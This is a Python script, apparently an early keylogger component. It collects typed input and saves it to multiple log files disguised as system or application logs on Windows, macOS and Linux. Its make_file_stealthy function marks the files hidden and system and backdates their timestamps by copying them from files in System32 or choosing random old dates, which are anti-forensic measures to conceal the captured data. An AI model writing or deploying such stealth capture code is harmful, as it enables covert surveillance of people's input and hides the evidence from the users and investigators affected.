import os
import sys
import win32api
import win32con
import time
import random

# Create logs folder first
os.makedirs("logs", exist_ok=True)

# Start with basic locations
locations_to_try = [
    "simple_log.txt",                    # Obvious - easy to find
    "./logs/system_log.txt",             # Looks like system logs
]

# Add platform-specific locations
if sys.platform.startswith('win'):
    locations_to_try.extend([
        os.path.expandvars("%TEMP%\\log.txt"),
        os.path.expandvars("%APPDATA%\\Microsoft\\log.txt"),
        os.path.expanduser("~/AppData/Local/Temp/tmp_log.txt")
    ])
elif sys.platform.startswith('darwin'):  # macOS
    locations_to_try.extend([
        os.path.expanduser("~/Library/Logs/keyboard.log"),
    ])
elif sys.platform.startswith('linux'):
    locations_to_try.extend([
        "/tmp/.log.txt",
        "~/.cache/log.txt",
        "/var/log/keyboard.log"
    ])

saved_word = []
success_count = 0           
failed_locations = []       

def make_file_stealthy(filepath, mimic_folder=None):
    """
    Make a file stealthy: hidden + spoofed timestamp
    """
    # 1. Hide the file (Hidden + System attributes)
    try:
        attrs = win32api.GetFileAttributes(filepath)
        win32api.SetFileAttributes(filepath, 
            attrs | win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        print(f"  ✓ Hidden: {filepath}")
    except Exception as e:
        print(f"  ✗ Could not hide: {e}")
    
    # 2. Spoof timestamp (ADD THIS PART!)
    try:
        if mimic_folder and os.path.exists(mimic_folder):
            # Copy timestamp from a random file
            files = [f for f in os.listdir(mimic_folder) 
                    if os.path.isfile(os.path.join(mimic_folder, f))]
            if files:
                random_file = os.path.join(mimic_folder, random.choice(files))
                stat = os.stat(random_file)
                os.utime(filepath, (stat.st_atime, stat.st_mtime))
                print(f"  ✓ Timestamp copied from: {os.path.basename(random_file)}")
        else:
            # Random old timestamp (30-180 days)
            days_old = random.randint(30, 180)
            old_time = time.time() - (days_old * 86400)
            os.utime(filepath, (old_time, old_time))
            print(f"  ✓ Random timestamp: {days_old} days old")
    except Exception as e:
        print(f"  ✗ Could not spoof timestamp: {e}")

while True:
    word = input()

    if word == "STOP":
        for location in locations_to_try:
            try:
                # Ensure folder exists
                folder = os.path.dirname(location)
                if folder:
                    os.makedirs(folder, exist_ok=True)
                
                # Save file
                with open(location, "w") as f:
                    for item in saved_word:
                        f.write(item + "\n")
                
                print(f"✓ Saved: {location}")
                
                # NEW: Apply stealth!
                if os.path.exists(location):
                    make_file_stealthy(location, mimic_folder="C:\\Windows\\System32")
                
                success_count += 1
                
            except Exception as e:
                print(f"✗ Failed: {location} - {type(e).__name__}")
                failed_locations.append(location)

        print(f"\nSummary: {success_count} succeeded, {len(failed_locations)} failed")
        if failed_locations:
            print(f"Failed: {failed_locations}")
        
        break
    else:
        saved_word.append(word)